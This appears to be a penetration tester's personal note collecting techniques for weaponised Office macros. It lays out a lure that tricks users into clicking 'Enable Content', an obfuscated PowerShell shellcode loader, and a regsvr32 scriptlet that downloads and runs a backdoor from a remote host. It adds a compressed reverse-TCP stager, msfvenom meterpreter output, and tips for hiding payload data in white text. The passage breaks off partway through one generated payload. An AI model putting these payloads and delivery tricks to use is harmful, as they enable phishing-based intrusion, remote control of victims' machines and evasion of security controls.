This is a note for myself describing various Visual Basic macros construction strategies that could be used for remote code execution via malicious Document vector.
Nothing new or fancy here, just a list of techniques, tools and scripts collected in one place for a quick glimpse of an eye before setting a payload.


_All of the below examples had been generated for using as a remote address: **192.168.56.101**._

List:

0. Page substiution macro for luring user to click _Enable Content_
1. The [Unicorn](https://github.com/trustedsec/unicorn) **Powershell** based payload
2. `regsvr32` based method
3. Metasploit generated payload `vba-exe`
4. Metasploit generated payload `vba-psh`
5. `Empire` generated `windows/macro` stager 
6. Using `Veil-Evasion` generated _powershell.exe_ command within `Luckystrike` generated macro
7. `wePWNise` architecture-independent Macro dynamically bypassing SRPs+EMET
8. Custom macro taking commands from *Author property* to feed them to `StdIn` of Powershell
9. ActiveX-based (`InkPicture` control, `Painted` event) autorun macro
10. Generate Base64-encoded HTA application to be decoded using `certutil`


---

**0. Page substiution macro for luring user to click _Enable Content_**

One can use the [following macro](https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6) for implementing a document-contents switch after luring user to click "Enable Content":

```
Public alreadyLaunched As Integer


Private Sub Malware()
    '
    ' ============================================
    '
    ' Enter here your malware code here.
    ' It will be started on auto open surely.
    '
    ' ============================================

    MsgBox ("Here comes the malware!")

    ' ============================================

End Sub


Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    Malware
    SubstitutePage
    alreadyLaunched = True
End Sub

Private Sub SubstitutePage()
    '
    ' This routine will take the entire Document's contents,
    ' delete them and insert in their place contents defined in
    ' INSERT -> Quick Parts -> AutoText -> named as in `autoTextTemplateName`
    '
    Dim doc As Word.Document
    Dim firstPageRange As Range
    Dim rng As Range
    Dim autoTextTemplateName As String

    ' This is the name of the defined AutoText prepared in the document,
    ' to be inserted in place of previous contents.
    autoTextTemplateName = "RealDoc"

    Set firstPageRange = Word.ActiveDocument.Range
    firstPageRange.Select
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1

    Set doc = ActiveDocument
    Set rng = doc.Sections(1).Range
    doc.AttachedTemplate.AutoTextEntries(autoTextTemplateName).Insert rng, True
    doc.Save

End Sub

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
```

The use case scenario goes as follows:

- We want the victim to click _"Enable Content"_ to get our macro code executed
- To do so, we prepare a fake "Need to Enable Content" message like compatibility issues, AV triggered flag or alike
- Then we place **entire real document contents** in an **AutoText** named `RealDoc` (Office ribbon -> INSERT -> Quick Parts -> AutoTexts -> name it: `RealDoc`)
- The user clicks the _"Enable Content"_ and the above macro gets executed firstly, making a page switch by deleting the fake warning message and pasting everything what has been stored in this very document in **AutoText** called `RealDoc`.


---



**1. The [Unicorn](https://github.com/trustedsec/unicorn) **Powershell** based payload**

This payload uses downgraded **Powershell.exe** command-line invocation that will download 2nd stage from the remote server and execute it on the owned machine.
The downside of this method is the fact that the `Unicorn` script generates only **Powershell.exe** related payload and also adds a MsgBox with english message stating that the Excel/Word application needs to be closed. Only then the payload gets launched properly.

**Example script:**

```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Sub Test()
Dim HsQgOKMOa
HsQgOKMOa = "-w 1 -C ""sv xW -;sv PrZ ec;sv dyS ((gv xW).value.toString()+(gv PrZ).value.toString());" & "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & " (gv dyS).value.toString() ('JABDAEgAeAAgAD0AIAAnACQAdQB4AHIAIAA9ACAAJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgA" _
& "gAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwAQQBsAGw'+'AbwBjAGEAdABpAG8AbgBUAHkAcABlACwAIAB1AGkAbgB0ACAAZgBsAFAAcgBvAHQAZQBjAHQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABJAG4AdABQAHQAcgAgAGwAcABU" _
& "AGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzACwAIAB1AG'+'kAbgB0ACAAZAB3AFMAdABhAGMAawBTAGkAegBlACwAIABJAG4AdABQAHQAcgAgAGwAcABTAHQAYQByAHQAQQBkAGQAcgBlAHMAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAUABhAHIAYQBtAGUAdABlAHIALAAgAHUAaQBuAHQAIABkAHcAQwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQASQBkACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBtAHMAdgBjAHIAdAAuAGQAbABsA" _
& "CIAKQBdA'+'HAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAbQBlAG0AcwBlAHQAKABJAG4AdABQAHQAcgAgAGQAZQBzAHQALAAgAHUAaQBuAHQAIABzAHIAYwAsACAAdQBpAG4AdAAgAGMAbwB1AG4AdAApADsAJwAnADsAJAB3ACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQAdQB4AHIAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBu'+'AGEAbQBlAHMAcABhAGMAZQAgAFcAaQB" _
& "uADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMANQAsADAAeABiAGQALAAwAHgAMQBhACwAMAB4ADYAMAAsADAAeABkAGIALAAwAHgAMgA3ACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGUALAAwAHgAMwAzACwAMAB4AGMAOQA'+'sADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA2AGUALAAwAHgAMQA4ACwAMAB4" _
& "ADAAMwAsADAAeAA2AGUALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADYALAAwAHgAMQBlACwAMAB4ADgAMgAsADAAeAAyAGUALAAwAHgAZABiACwAMAB4AGYANgAsADAAeABjADAALAAwAHgAZAAxACwAMAB4ADIANAAsADAAeAAwADYALAAwAHgAYQA1ACwAMAB4ADUAOAAsADAAeABjADEALAAwAHgAMwA3ACwAMAB4AGUANQAsADAAeAAzAGYALA'+'AwAHgAOAAxACwAMAB4ADYANwAsADAAeABkADUALAAwAHgAMwA0ACwAMAB4AGMANwAsADAAeAA4AGIALAAwAHgAOQBlACwAMAB4ADEAOQAsADAAeABmA" _
& "GMALAAwAHgAMQA4ACwAMAB4AGQAMgAsADAAeABiADUALAAwAHgAZgAzACwAMAB4AGEAOQAsADAAeAA1ADkALAAwAHgAZQAwACwAMAB4ADMAYQAsADAAeAAyAGEALAAwAHgAZgAxACwAMAB4AGQAMAAsADAAeAA1AGQALAAwAHgAYQA4ACwAMAB4ADAAOAAsADAAeAAwADUALAAwAHgAYgBlACwAM'+'AB4ADkAMQAsADAAeABjADIALAAwAHgANQA4ACwAMAB4AGIAZgAsADAAeABkADYALAAwAHgAMwBmACwAMAB4ADkAMAAsADAAeABlAGQALAAwAHgAOABmACwAMAB4ADMANAAsADAAeAAwADcALAAwAHgAMAAyAC" _
& "wAMAB4AGEANAAsADAAeAAwADEALAAwAHgAOQA0ACwAMAB4AGEAOQAsADAAeABmADYALAAwAHgAOAA0ACwAMAB4ADkAYwAsADAAeAA0AGUALAAwAHgANABlACwAMAB4AGEANgAsADAAeAA4AGQALAAwAHgAYwAwACwAMAB4AGMANQAsADAA'+'eABmADEALAAwAHgAMABkACwAMAB4AGUAMgAsADAAeAAwAGEALAAwAHgAOABhACwAMAB4ADAANwAsADAAeABmAGMALAAwAHgANABmACwAMAB4AGIANwAsADAAeABkAGUALAAwAHgANwA3ACwAMAB4AGIAYgAsADAAeAA0ADMALAAwAHgAZQAxACwAMAB4ADUAMQAsADA" _
& "AeABmADIALAAwAHgAYQBjACwAMAB4ADQAZQAsADAAeAA5AGMALAAwAHgAMwBiACwAMAB4ADUAZgAsADAAeAA4AGUALAAwAHgAZAA4ACwAMAB4AGYAYgAsADAAeAA4ADAALAAwAHg'+'AZQA1ACwAMAB4ADEAMAAsADAAeABmADgALAAwAHgAMwBkACwAMAB4AGYAZQAsADAAeABlADYALAAwAHgAOAAzACwAMAB4ADkAOQAsADAAeAA4AGIALAAwAHgAZgBjACwAMAB4ADIAMwAsADAAeAA2ADkALAAwAHgAMgBiACwAMAB4AGQAOQAsADAAeABkADIALAAwAHgAYgBlACwAMAB4AGEAYQAsADAAeABhAGEALAAwAHgA" _
& "ZAA4ACwAMAB4ADAAYgAsADAAeABiADgALAAwAHgAZgA1ACwAMAB4AGYAYwAsADAAeAA4AGEALAAwAHgANgBkACwAMAB4AD'+'gAZQAsADAAeABmADgALAAwAHgAMAA3ACwAMAB4ADkAMAAsADAAeAA0ADEALAAwAHgAOAA5ACwAMAB4ADUAYwAsADAAeABiADcALAAwAHgANAA1ACwAMAB4AGQAMgAsADAAeAAwADcALAAwAHgAZAA2ACwAMAB4AGQAYwAsADAAeABiAGUALAAwAHgAZQA2ACwAMAB4AGUANwAsADAAeAAzAGYALAAwAHgANgAxACwAMAB4ADUANgAsADAAeAA0ADIALAAwAHgANABiACwAMAB4ADgAZ" _
& "gAsADAAeAA4ADMALAAwAHgAZgBmACwAMAB4ADEANgAsADAAeABjA'+'DcALAAwAHgANgAwACwAMAB4ADMAMgAsADAAeABhADkALAAwAHgAMQA3ACwAMAB4AGUAZgAsADAAeAA0ADUALAAwAHgAZABhACwAMAB4ADIANQAsADAAeABiADAALAAwAHgAZgBkACwAMAB4ADcANAAsADAAeAAwADUALAAwAHgAMwA5ACwAMAB4AGQAOAAsADAAeAA4ADMALAAwAHgANgBhACwAMAB4ADEAMAAsADAAeAA5AGMALAAwAHgAMQBjACwAMAB4ADkANQAsADAAeAA5AGIALAAwAHgAZABkACwAMAB4ADMANQAsADAAeAA1ADEALA" _
& "AwAHgAYwBm'+'ACwAMAB4ADgAZAAsADAAeAAyAGQALAAwAHgANwAwACwAMAB4ADcAMAAsADAAeAA0ADYALAAwAHgAYQBlACwAMAB4ADcAZAAsADAAeABhADUALAAwAHgAZgAzACwAMAB4AGEAYgAsADAAeABlADkALAAwAHgAOAA2ACwAMAB4AGEAYwAsADAAeAA4AGMALAAwAHgAOABjACwAMAB4ADYAZQAsADAAeABhAGYALAAwAHgAZQBjACwAMAB4ADQAZgAsADAAeABkADQALAAwAHgAMgA2ACwAMAB4ADAAYQAsADAAeAAxAGYALAAwAHgANwBhACwAMAB4ADYAOQA'+'sADAAeAA4ADMALAAwAHgAZABmACwA" _
& "MAB4ADIAYQAsADAAeABjADkALAAwAHgANwAzACwAMAB4AGIANwAsADAAeAAyADAALAAwAHgAYwA2ACwAMAB4AGEAYwAsADAAeABhADcALAAwAHgANABhACwAMAB4ADAAYwAsADAAeABjADUALAAwAHgANABkACwAMAB4AGEANQAsADAAeABmADkALAAwAHgAYgBkACwAMAB4AGYAOQAsADAAeAA1AGMALAAwAHgAYQAwACwAMAB4ADMANgAsADAAeAA5ADgALAAwAHgAYQAxACwAMAB4ADcAZQAsADAAeAAzADMALA'+'AwAHgAOQBhACwAMAB4ADIAYQAsADAAeAA4AGQALAAwAHgAYwAzACwAMAB4ADUANAAsADAAe" _
& "ABkAGIALAAwAHgAZgA4ACwAMAB4AGQANwAsADAAeAAwADAALAAwAHgAMgBiACwAMAB4AGIANwAsADAAeAA4AGEALAAwAHgAOAA2ACwAMAB4ADMANAAsADAAeAA2AGQALAAwAHgAYQAwACwAMAB4ADIANgAsADAAeABhADEALAAwAHgAOABhACwAMAB4ADYAMwAsADAAeAA3ADEALAAwAHgANQBkACwAMAB4ADkAMQAsADAAeAA1ADIALAAwAHgAYgA1ACwAM'+'AB4AGMAMgAsADAAeAA2AGEALAAwAHgAYgAxACwAMAB4AGMAZQAsADAAeABjAGIALAAwAHgAZgBlACwAMAB4ADcAYQAsADAAeABiADgALAAwAHgAMw" _
& "AzACwAMAB4AGUAZgAsADAAeAA3AGEALAAwAHgAMwA4ACwAMAB4ADYAMgAsADAAeAA2ADUALAAwAHgANwBiACwAMAB4ADUAMAAsADAAeABkADIALAAwAHgAZABkACwAMAB4ADIAOAAsADAAeAA0ADUALAAwAHgAMQBkACwAMAB4AGMAOAAsADAAeAA1AGMALAAwAHgAZAA2ACwAMAB4ADgAOAAsADAA'+'eABmADMALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAxAGIALAAwAHgAOQBjACwAMAB4AGIAYQAsADAAeABmADIALAAwAHgANgBjACwAMAB4ADAAMwAsADAAeAA0ADQALAAwAHgAZAAxACwAMAB4ADYAYwA" _
& "sADAAeAA3AGYALAAwAHgAOQAzACwAMAB4ADEAZgAsADAAeAAxAGIALAAwAHgAOQAxACwAMAB4ADIANwA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACk'+'AewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAUwBUAGsAPQAkAHcAOgA6AFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgAMAAsADAAeAAxADAAMAAwACwAJABnACwAMAB4ADQAMAApADsAZgBvAHIAIAAoACQAaQA9ADAAOwAkAGkAIAAtAGwAZQAg" _
& "ACgAJAB6AC4ATABlAG4AZwB0AGgALQAxACkAOwAkAGkAKwArACkAIAB7ACQAdwA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAFMAVABrAC4AVABvAEkAbgB0AD'+'MAMgAoACkAKwAkAGkAKQAsACAAJAB6AFsAJABpAF0ALAAgADEAKQB9ADsAJAB3ADoAOgBDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoADAALAAwACwAJABTAFQAawAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5A" _
& "HMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlA'+'G0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAEMASAB4ACkAKQA7ACQATABtAE8AIAA9ACAAIgAtAGUAYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQATwBiAEUAdgAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgAC" _
& "sAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQ'+'AG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJABPAGIARQB2ACAAJABMAG0ATwAgACQAZQAiAH0AZQBsAHMAZQB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABMAG0ATwAgACQAZQAiADsAfQA=')"""

Dim EUrxrXO
EUrxrXO = "S" & "h" & "e" & "l" & "l"
Dim aHiMN
aHiMN = "W" & "S" & "c" & "r" & "i" & "p" & "t"
Dim XkOPOzVOswzjeFO
XkOPOzVOswzjeFO = aHiMN & "." & EUrxrXO
Dim DxDAIPQizB
Dim ToHtLtKuKfUGc
Set DxDAIPQizB = VBA.CreateObject(XkOPOzVOswzjeFO)
Dim jMkUOSWtofK
jMkUOSWtofK = "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & "." & "e" & "x" & "e" & " "
ToHtLtKuKfUGc = DxDAIPQizB.Run(jMkUOSWtofK & HsQgOKMOa, 0, False)
Dim title As String
title = "Microsoft Office Corrupt Application (Compatibility Mode)"
Dim msg As String
Dim intResponse As Integer
msg = "This application appears to be made on an older version of the Microsoft Office product suite. Please have the author save to a newer and supported format. [Error Code: -219]"
intResponse = MsgBox(msg, 16, title)
Application.Quit
End Sub
```


---


**2. `regsvr32` based method**

This method works by making built-in Microsoft tool named `regsvr32` that is used for registering and unregistering OLE Controls / ActiveX objects even from remote resources in a form of **scriptlet** files (`.sct`). By leveraging that feature we can supply remotely hosted (on the attacker-controlled web server) malicious _scriptlet_ file that would after being loaded execute arbitrary commands on the victim's machine.

The biggest advantage of this method is that the `regsvr32` application is by default whitelisted one and therefore can be used for remote code execution within restricted by AppLocker or Software Restriction Policies (SRPs) environment. In other words, if the victim user is disallowed from running untrusted applications, the `regsvr32` will be the one to go for in order to bypass application whitelisting.

(This technique could be further automated using `exploit/windows/misc/regsvr32_applocker_bypass_server` module in _Metasploit_).

As an example of such scriptlets we can use one of the [Casey Smith's payloads](https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302):

**File: `bandit.sct`**
```
<?XML version="1.0"?>
<scriptlet>
	<registration progid="PqYOEI6w" classid="{057b64c8-1107-cda1-3d34-062978395f62}">
		<script>
			<![CDATA[ 
			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.56.101/backdoor');", 0);
			]]>
		</script>
	</registration>
</scriptlet>
```

Then one will have to serve a `backdoor` file on the Web server that would connect back to the listener, for instance CMD Powershell reverse tcp:

```
powershell.exe -nop -w hidden -c 'if([IntPtr]::Size -eq 4){$b=''powershell.exe''}else{$b=$env:windir+''\syswow64\WindowsPowerShell\v1.0\powershell.exe''};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=''-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''''H4sIAI7tmlkCA7VWbW+jOBD+3JX2P6BVJEBK89bsZltppYMkNLShTUpD3i46uWDAiYNTY5qXvf3vNySwTbXtqbfSoVaxmRl7/DzPjPGTyBWERdLaIWjUkL5//HDSQxwtJaWwxb4bbr8WpQJqW3iNqurJCZgLNODY0aRvkjLVVqsWWyISzS4umgnnOBKHeekSCy2O8fKBEhwrqvS3NAwxx6e3D3PsCum7VPirdEnZA6KZ27aJ3BBLp1rkpbYuc1GaWMleUSIU+c8/ZXV6Wp2V2o8JorEi29tY4GXJo1RWpR9quuH9doUV2SIuZzHzRWlIorNaaRDFyMc3sNoTtrAImRfLKpwD/jgWCY+k7ETpEgcHRYZhjzNX8zyOY/AvmdETW2ClECWUFqU/lGm2/10SCbLEYBeYs5WN+RNxcVzqoMij+A77M+UGr/NjvzdIOQ4Cr57gahEoeTVRi3kJxYdYWf011ZxIFZ4jMgGDHx8/fPzg5xLw1zFvfW6Mj0UAo5PpfowhVaXHYrL3/SZVipIFWyLB+BamhXueYHUmTVMSprOZVBC3V8W3w6u5L3hG17WzcRg61XMwTB1GvBkEZhwVWCNatHjlbmim1rcV18I+iXBrG6ElcXNRKa+hj32K90cu5W43kKAiZwbstTDFARIpmkVp+mtYe0nEz1g9IdTDXHOBwRiyAnLVl8kcCFJkM7LwEuA6zGXgwgcp49w7k+823z2dg5PcpCiOi1IvgVpyi5KNEcVeUdKimGQmLRFsP5Sf07USKoiLYpEvN1Nfopnt2mRRLHjiAo+AwL29wi5BNAWkKHWIh/WtTYJ8d/lVOJqIUhIFsNIT0AFvUhhskaqDQ6KpEtSSjYW5XFG8BJd9ZRsUBVDHWS3s1YQC7Mmvp5nr/SDuFJYcj6MkgWubMlGUHMIFtIkU4mdx/VYmR13iKKcmxxlBSl5GU30rUuEXFg3v646kWs2Q2uPCBWBicLbUUYy/1G3BATHlU/mWNDV4xmZELVdfkKq2JlXTgv8BOTNZq+FdX807Zd7ahL5mxqbV6bX6nU796cp26sJum+K6ZwqrPZrPba1zNxiLial17kllMa7vVldkZ3c1b7wpf9npu3VF3+zmgeePW74fNHz7rvrZIN1hs69Xaqjbaifdob7WK/W4TdadPhn0F1eGeBg7FA38cjCqniOy6fK5U2XWztS0y/DM3V35zmVoedtxp3w+rC+0tqY1o7Zj6Ox6rHOtV3ZQ4LD1dVCfDIOmphsuwZP+wND7fUPXBpfzx9Z5OYDYEQr1oVMjk9XoLoS5ASlY5Urd9PCGfe0OifOUrqU/6sZkhLTuZGuUy9VxXEMLnWk6gGhMHiGn8croUYi/H9SY5tCbZ99+p3XtTqqN2Pr2KeUWyC2sa7iCwstR0D4/ouytBm0hHoeIApXQd/PCMhg3sh7aYySNUJTsOl1gHmEKlxBcU7koNUqZm3bzn/0WbpNDj59BeQ1geFZ7daRKPx3V5z6fv7q4mECuIPKDAEtdHAUiLFY2Z5UKNOvKpl6BQ7//hE222irZYsW03R9j9bwN3W+jpiVQWN4xe7T06sMq/r/BzCowhB/vPWA+v/sX67sArhRfAPGL9eWL/wT5b+AwRESArw3dhOLDPfc2HJmMjr4RjhgDpfjZk36u3Sbi9Aa+IP4BA1mEpCIKAAA=''''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=''Hidden'';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);'
```


The above file has to be stored on the remotely accessible web server and named for instance **bandit.sct**. Then, we can use the following macro embedded in Office file that will be sent to the victim for opening:

**Macro/Script to be used in Malicious Document**:
```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
    Dim shell
    Dim out
    Set shell = VBA.CreateObject("WScript.Shell")
    out = shell.Run("regsvr32 /u /n /s /i:http://192.168.56.101/bandit.sct scrobj.dll", 0, False)
End Sub
```

So the entire attack goes as follows:

- Malicious document with `Run("regsvr32 [...] /i:http://[...]/file.sct")` 
- `file.sct` delivers Powershell Download & Exec command (`backdoor`)
- `backdoor` Powershell CMD reverse tcp 2nd stage gets delivered and executed


---


**3. Metasploit generated payload `vba-exe`**

In this method, we leverage the Metasploit's `msfvenom` utility to generate a `vba-exe` payload that consists of two parts:

- A macro that shall be pasted in `Auto_Open` function
- An exe file encoded in form of "&H" hex chars long blob.

We can generate this macro as follows:

```
work|16:42|~ # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f vba-exe
```

Then we will get the following output:
```
'**************************************************************
'*
'* This code is now split into two pieces:
'*  1. The Macro. This must be copied into the Office document
'*     macro editor. This macro will run on startup.
'*
'*  2. The Data. The hex dump at the end of this output must be
'*     appended to the end of the document contents.
'*
'**************************************************************
'*
'* MACRO CODE
'*
'**************************************************************

Sub Auto_Open()
	Ctjwp12
End Sub

Sub Ctjwp12()
	Dim Ctjwp7 As Integer
	Dim Ctjwp1 As String
	Dim Ctjwp2 As String
	Dim Ctjwp3 As Integer
	Dim Ctjwp4 As Paragraph
	Dim Ctjwp8 As Integer
	Dim Ctjwp9 As Boolean
	Dim Ctjwp5 As Integer
	Dim Ctjwp11 As String
	Dim Ctjwp6 As Byte
	Dim Vvdicidvtv as String
	Vvdicidvtv = "Vvdicidvtv"
	Ctjwp1 = "EVVVfVKLSHcv.exe"
	Ctjwp2 = Environ("USERPROFILE")
	ChDrive (Ctjwp2)
	ChDir (Ctjwp2)
	Ctjwp3 = FreeFile()
	Open Ctjwp1 For Binary As Ctjwp3
	For Each Ctjwp4 in ActiveDocument.Paragraphs
		DoEvents
			Ctjwp11 = Ctjwp4.Range.Text
		If (Ctjwp9 = True) Then
			Ctjwp8 = 1
			While (Ctjwp8 < Len(Ctjwp11))
				Ctjwp6 = Mid(Ctjwp11,Ctjwp8,4)
				Put #Ctjwp3, , Ctjwp6
				Ctjwp8 = Ctjwp8 + 4
			Wend
		ElseIf (InStr(1,Ctjwp11,Vvdicidvtv) > 0 And Len(Ctjwp11) > 0) Then
			Ctjwp9 = True
		End If
	Next
	Close #Ctjwp3
	Ctjwp13(Ctjwp1)
End Sub

Sub Ctjwp13(Ctjwp10 As String)
	Dim Ctjwp7 As Integer
	Dim Ctjwp2 As String
	Ctjwp2 = Environ("USERPROFILE")
	ChDrive (Ctjwp2)
	ChDir (Ctjwp2)
	Ctjwp7 = Shell(Ctjwp10, vbHide)
End Sub

Sub AutoOpen()
	Auto_Open
End Sub

Sub Workbook_Open()
	Auto_Open
End Sub

'**************************************************************
'*
'* PAYLOAD DATA
'*
'**************************************************************

Vvdicidvtv
&H4D&H5A&H90&H00&H03&H00&H00&H00&H04&H00&H00&H00&HFF&HFF&H00&H00&HB8&H00&H00&H00&H00&H00&H00&H00&H40&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H80&H00&H00&H00&H0E&H1F&HBA&H0E&H00&HB4&H09&HCD&H21&HB8&H01&H4C&HCD&H21&H54&H68&H69&H73&H20&H70&H72&H6F&H67&H72&H61&H6D&H20&H63&H61&H6E&H6E&H6F&H74&H20&H62&H65&H20&H72&H75&H6E&H20&H69&H6E&H20&H44&H4F&H53&H20&H6D&H6F&H64&H65&H2E&H0D&H0D&H0A&H24&H00&H00&H00&H00&H00&H00&H00&H50&H45&H00&H00&H4C&H01&H03&H00&H8F&HC9&H1C&H93&H00&H00&H00&H00&H00&H00&H00&H00&HE0&H00&H0F&H03&H0B&H01&H02&H38&H00&H02&H00&H00&H00&H0E&H00&H00&H00&H00&H00&H00&H00&H10&H00&H00&H00&H10&H00&H00&H00&H20&H00&H00&H00&H00&H40&H00&H00&H10&H00&H00&H00&H02&H00&H00&H04&H00&H00&H00&H01&H00&H00&H00&H04&H00&H00&H00&H00&H00&H00&H00&H00&H40&H00&H00&H00&H02&H00&H00&H46&H3A&H00&H00&H02&H00&H00&H00&H00&H00&H20&H00&H00&H10&H00&H00&H00&H00&H10&H00&H00&H10&H00&H00&H00&H00&H00&H00&H10&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H30&H00&H00&H64&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00
[...]
&H0D&H55&H20&H4D&H57
```

As the macro's comment suggest, the long blob of bytes at the end of this script have to be simply pasted to the document's contents (one of Active document's Paragraphs). In order to avoid suspitions one can set a white colored font of smallest possible size to avoid lurking at the blob.

---


**4. Metasploit generated payload `vba-psh`**

In this method, we leverage the Metasploit's `msfvenom` utility to generate a `vba-psh` payload that is similar to `Unicorn` in its form meaning that this is a payload consiting of `powershell.exe` invocation.

We can generate this macro as follows:

```
work|16:42|~ # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f vba-psh
```

Then we will get the following output:

```
Sub pm6HSAm()
  Dim rkEsZ
  rkEsZ = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB" _
& "3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHM" _
